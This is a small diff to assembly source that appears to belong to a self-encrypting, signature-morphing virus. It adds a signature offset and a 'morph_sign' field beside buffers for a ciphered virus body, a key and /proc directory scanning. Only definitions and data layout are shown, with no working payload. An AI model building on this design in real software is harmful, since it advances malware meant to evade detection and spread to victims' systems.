@@ -53,6 +53,8 @@
 %define RETURN_JUMP_OFFSET	_end - _exx
 %define RETURN_JUMP_VALUE_OFFSET _end - _exx - + 5
 
+%define SIGNATURE_OFFSET	signature - _start + 41
+
 ; MACROS
 %macro PUSH 0
 	push rax
@@ -210,6 +212,7 @@
 .tocypher		resb	0x5000			; location to cyphered v
 .key			resb	1				; location to key
 .factor			resb	1				; factor to derivate key
+.morph_sign		resb	1				; factor to add to signature
 .commpath		resb	100				; path to commfiles
 .dirents_proc	resb	DIRENT_ARR_SIZE	; Array of dirents for /proc
 endstruc
